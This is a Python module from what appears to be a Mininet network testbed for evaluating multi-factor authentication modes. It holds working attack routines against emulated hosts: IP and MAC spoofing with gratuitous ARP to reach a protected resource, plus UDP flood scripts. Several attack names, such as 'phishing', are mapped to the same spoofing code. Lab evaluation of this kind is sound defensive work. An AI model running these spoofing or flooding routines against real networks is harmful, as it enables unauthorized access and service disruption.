from __future__ import annotations

import json
import os
import subprocess
import time
from dataclasses import dataclass
from typing import Dict, Any, Optional, Callable

from .base_attack import AttackConfig, AttackResult

MN_INFO_PATH = "/tmp/sdnmfa_mn.json"
SENSITIVE_TEXT = "This is a sensitive resource."

def _read_mn() -> Dict[str, Any]:
    if not os.path.exists(MN_INFO_PATH):
        raise RuntimeError("Mininet info not found. Start topology.py first.")
    with open(MN_INFO_PATH, "r", encoding="utf-8") as f:
        return json.load(f)

def _mn_pid(mn: Dict[str, Any], host: str) -> int:
    return int(mn[host]["pid"])

def _run(argv: list, timeout: Optional[int] = None) -> tuple[int, str]:
    p = subprocess.run(argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=timeout)
    return p.returncode, p.stdout

def _ns(host_pid: int, cmd: str, timeout: Optional[int] = None) -> tuple[int, str]:
    return _run(["mnexec", "-a", str(host_pid), "bash", "-lc", cmd], timeout=timeout)

def _get_iface(host_pid: int) -> str:
    rc, out = _ns(
        host_pid,
        "ip -o link show | awk -F': ' '{print $2}' | grep -v '^lo' | head -n 1 | cut -d'@' -f1",
        timeout=3,
    )
    iface = out.strip().splitlines()[0] if out.strip() else ""
    if not iface:
        iface = "eth0"
    return iface

def _get_ip(host_pid: int) -> str:
    rc, out = _ns(host_pid, "ip -o -4 addr show scope global | awk '{print $4}' | head -n 1", timeout=3)
    return out.strip().split('/')[0] if out.strip() else ""

def _get_mac(host_pid: int) -> str:
    iface = _get_iface(host_pid)
    rc, out = _ns(host_pid, f"cat /sys/class/net/{iface}/address 2>/dev/null | head -n 1", timeout=3)
    return out.strip().lower()

def _set_identity(host_pid: int, ip: Optional[str] = None, mac: Optional[str] = None) -> None:
    iface = _get_iface(host_pid)
    if mac:
        _ns(host_pid, f"ip link set dev {iface} down", timeout=3)
        _ns(host_pid, f"ip link set dev {iface} address {mac}", timeout=3)
        _ns(host_pid, f"ip link set dev {iface} up", timeout=3)
    if ip:
        _ns(host_pid, f"ip addr flush dev {iface}", timeout=3)
        _ns(host_pid, f"ip addr add {ip}/24 dev {iface}", timeout=3)

def _curl_sensitive(host_pid: int, url: str, timeout_s: int = 2) -> tuple[bool, str]:
    cmd = f"curl -m {timeout_s} -s -o - -w '\\nHTTP:%{{http_code}}\\n' {url}"
    rc, out = _ns(host_pid, cmd, timeout=timeout_s + 2)
    txt = out.strip()
    return (SENSITIVE_TEXT in txt), txt

def _grat_arp(host_pid: int, ip: str) -> None:
    iface = _get_iface(host_pid)
    _ns(host_pid, f"arping -U -c 2 -I {iface} {ip} >/dev/null 2>&1 || true", timeout=3)

def _del_neigh(host_pid: int, ip: str) -> None:
    iface = _get_iface(host_pid)
    _ns(host_pid, f"ip neigh del {ip} dev {iface} 2>/dev/null || true", timeout=3)

def _udp_flood(host_pid: int, dst_ip: str, dst_port: int, duration_s: int, payload: int = 512) -> None:
    code = (
        "import socket,time,os;"
        "d=os.environ.get('D','10.0.0.2');p=int(os.environ.get('P','18080'));"
        "t=time.time()+float(os.environ.get('T','5'));"
        "s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);"
        "b=b'x'*int(os.environ.get('B','512'));"
        "addr=(d,p);"
        "n=0;"
        "while time.time()<t:"
        " s.sendto(b,addr);"
        " n+=1;"
        "print(n)"
    )
    env = os.environ.copy()
    env["D"] = str(dst_ip)
    env["P"] = str(dst_port)
    env["T"] = str(duration_s)
    env["B"] = str(payload)
    subprocess.run(["mnexec", "-a", str(host_pid), "python3", "-c", code], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def _get_h1_in_port(h1_mac: str) -> Optional[int]:
    try:
        out = subprocess.check_output(["bash", "-lc", "ovs-appctl fdb/show s1 2>/dev/null || true"], text=True)
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 2 and parts[0].isdigit():
                port = int(parts[0])
                mac = parts[1].lower()
                if mac == h1_mac.lower():
                    return port
    except Exception:
        return None
    return None

@dataclass
class AttackMeta:
    display_name: str
    key: str

class AttackManager:
    def __init__(self):
        self._attacks: Dict[str, Callable[[AttackConfig], AttackResult]] = {
            "credential_forgery": self._attack_ip_spoof,
            "credential_theft": self._attack_ip_mac_spoof,
            "phishing": self._attack_ip_mac_spoof,
            "token_forgery": self._attack_ip_spoof,
            "unauthorized_access": self._attack_direct,
            "dos_udp_flood": self._attack_dos,
            "ddos_udp_flood": self._attack_ddos,
            "mitm": self._attack_ip_mac_spoof
        }
        self._display: Dict[int, AttackMeta] = {
            1: AttackMeta("Credential Forgery", "credential_forgery"),
            2: AttackMeta("Credential Theft", "credential_theft"),
            3: AttackMeta("Phishing", "phishing"),
            4: AttackMeta("Token Forgery", "token_forgery"),
            5: AttackMeta("Unauthorized Access", "unauthorized_access"),
            6: AttackMeta("Dos Udp Flood", "dos_udp_flood"),
            7: AttackMeta("Ddos Udp Flood", "ddos_udp_flood"),
            8: AttackMeta("Mitm", "mitm")
        }

    def get_available_attacks(self):
        return list(self._attacks.keys())

    def get_available_attacks_display(self):
        return {k: (v.display_name, v.key) for k, v in self._display.items()}

    def execute_attack(self, attack_type: str, cfg: AttackConfig) -> AttackResult:
        if attack_type not in self._attacks:
            return AttackResult(success=False, message=f"Unknown attack: {attack_type}", metrics={})
        try:
            return self._attacks[attack_type](cfg)
        except Exception as e:
            return AttackResult(success=False, message=f"Attack execution error: {e}", metrics={"attack_type": attack_type, "mode": cfg.mfa_mode})

    def _prepare(self) -> Dict[str, Any]:
        return _read_mn()

    def _attack_direct(self, cfg: AttackConfig) -> AttackResult:
        mn = self._prepare()
        url = mn["sensitive"]["path"]
        h3 = _mn_pid(mn, "h3")
        ok, body = _curl_sensitive(h3, url, timeout_s=2)
        return AttackResult(success=ok, message=("Sensitive resource accessed" if ok else "Access blocked"), metrics={"mode": cfg.mfa_mode, "url": url, "body": body[:120]})

    def _attack_ip_spoof(self, cfg: AttackConfig) -> AttackResult:
        mn = self._prepare()
        url = mn["sensitive"]["path"]
        h3 = _mn_pid(mn, "h3")
        h1 = _mn_pid(mn, "h1")
        h2 = _mn_pid(mn, "h2")
        h1_iface = _get_iface(h1)
        orig_ip = _get_ip(h3)
        orig_mac = _get_mac(h3)
        try:
            _ns(h1, f"ip link set dev {h1_iface} down", timeout=2)
            _set_identity(h3, ip="10.0.0.1")
            _del_neigh(h2, "10.0.0.1")
            _ns(h3, "ip neigh flush all", timeout=2)
            _grat_arp(h3, "10.0.0.1")
            time.sleep(0.4)
            ok, body = _curl_sensitive(h3, url, timeout_s=2)
            diag = {}
            if not ok:
                _, ip_out = _ns(h3, "ip -o -4 addr show; ip -4 route show", timeout=3)
                _, neigh_out = _ns(h3, "ip neigh show || true", timeout=3)
                diag = {"net": ip_out.strip()[:500], "neigh": neigh_out.strip()[:500]}
            m = {"mode": cfg.mfa_mode, "spoof": "ip", "body": body[:300]}
            m.update(diag)
            return AttackResult(success=ok, message=("Bypass succeeded" if ok else "Bypass blocked"), metrics=m)
        finally:
            try:
                _set_identity(h3, ip=orig_ip, mac=orig_mac)
            except Exception:
                pass
            try:
                _del_neigh(h2, "10.0.0.1")
                _ns(h1, f"ip link set dev {h1_iface} up", timeout=2)
            except Exception:
                pass

    def _attack_ip_mac_spoof(self, cfg: AttackConfig) -> AttackResult:
        mn = self._prepare()
        url = mn["sensitive"]["path"]
        h3 = _mn_pid(mn, "h3")
        h1 = _mn_pid(mn, "h1")
        h2 = _mn_pid(mn, "h2")
        h1_iface = _get_iface(h1)
        h1_mac = mn["h1"]["mac"]
        orig_ip = _get_ip(h3)
        orig_mac = _get_mac(h3)
        try:
            _ns(h1, f"ip link set dev {h1_iface} down", timeout=2)
            _set_identity(h3, mac=h1_mac, ip="10.0.0.1")
            _del_neigh(h2, "10.0.0.1")
            _ns(h3, "ip neigh flush all", timeout=2)
            _grat_arp(h3, "10.0.0.1")
            time.sleep(0.6)
            ok, body = _curl_sensitive(h3, url, timeout_s=2)
            diag = {}
            if not ok:
                _, ip_out = _ns(h3, "ip -o -4 addr show; ip -4 route show", timeout=3)
                _, neigh_out = _ns(h3, "ip neigh show || true", timeout=3)
                diag = {"net": ip_out.strip()[:500], "neigh": neigh_out.strip()[:500]}
            m = {"mode": cfg.mfa_mode, "spoof": "ip_mac", "body": body[:300]}
            m.update(diag)
            return AttackResult(success=ok, message=("Spoof succeeded" if ok else "Spoof blocked"), metrics=m)
        finally:
            try:
                _set_identity(h3, ip=orig_ip, mac=orig_mac)
            except Exception:
                pass
            try:
                _del_neigh(h2, "10.0.0.1")
                _ns(h1, f"ip link set dev {h1_iface} up", timeout=2)
            except Exception:
                pass
    def _attack_dos(self, cfg: AttackConfig) -> AttackResult:
        mn = self._prepare()
        url = mn["sensitive"]["path"]
        h1 = _mn_pid(mn, "h1")
        h3 = _mn_pid(mn, "h3")
        orig_ip = _get_ip(h3)
        orig_mac = _get_mac(h3)
        h1_mac = mn["h1"]["mac"]
        try:
            if cfg.mfa_mode == "password_only":
                _set_identity(h3, ip="10.0.0.1")
            elif cfg.mfa_mode in ("password_otp", "password_biometric", "password_otp_biometric"):
                _set_identity(h3, mac=h1_mac, ip="10.0.0.1")
            time.sleep(0.2)
            code = "import socket,time; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); t=time.time()+5; addr=('10.0.0.2',18080); b=b'x'*512;\nwhile time.time()<t: s.sendto(b,addr)"
            p = subprocess.Popen(["mnexec", "-a", str(h3), "python3", "-c", code], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            ok_before, _ = _curl_sensitive(h1, url, timeout_s=2)
            time.sleep(1.0)
            ok_during, _ = _curl_sensitive(h1, url, timeout_s=2)
            try:
                p.wait(timeout=8)
            except Exception:
                p.kill()
            ok_after, _ = _curl_sensitive(h1, url, timeout_s=2)
            degraded = ok_before and (not ok_during or not ok_after)
            return AttackResult(success=degraded, message=("Availability degraded" if degraded else "Availability preserved"), metrics={"mode": cfg.mfa_mode, "ok_before": ok_before, "ok_during": ok_during, "ok_after": ok_after})
        finally:
            try:
                _set_identity(h3, ip=orig_ip, mac=orig_mac)
            except Exception:
                pass

    def _attack_ddos(self, cfg: AttackConfig) -> AttackResult:
        mn = self._prepare()
        url = mn["sensitive"]["path"]
        h1 = _mn_pid(mn, "h1")
        h3 = _mn_pid(mn, "h3")
        orig_ip = _get_ip(h3)
        orig_mac = _get_mac(h3)
        h1_mac = mn["h1"]["mac"]
        try:
            if cfg.mfa_mode == "password_only":
                _set_identity(h3, ip="10.0.0.1")
            elif cfg.mfa_mode in ("password_otp", "password_biometric", "password_otp_biometric"):
                _set_identity(h3, mac=h1_mac, ip="10.0.0.1")
            time.sleep(0.2)
            code = "import socket,time; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); t=time.time()+5; addr=('10.0.0.2',18080); b=b'x'*1024;\nwhile time.time()<t: s.sendto(b,addr)"
            procs = []
            for _ in range(3):
                procs.append(subprocess.Popen(["mnexec", "-a", str(h3), "python3", "-c", code], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            ok_before, _ = _curl_sensitive(h1, url, timeout_s=2)
            time.sleep(1.0)
            ok_during, _ = _curl_sensitive(h1, url, timeout_s=2)
            for p in procs:
                try:
                    p.wait(timeout=8)
                except Exception:
                    p.kill()
            ok_after, _ = _curl_sensitive(h1, url, timeout_s=2)
            degraded = ok_before and (not ok_during or not ok_after)
            return AttackResult(success=degraded, message=("Availability degraded" if degraded else "Availability preserved"), metrics={"mode": cfg.mfa_mode, "ok_before": ok_before, "ok_during": ok_during, "ok_after": ok_after})
        finally:
            try:
                _set_identity(h3, ip=orig_ip, mac=orig_mac)
            except Exception:
                pass
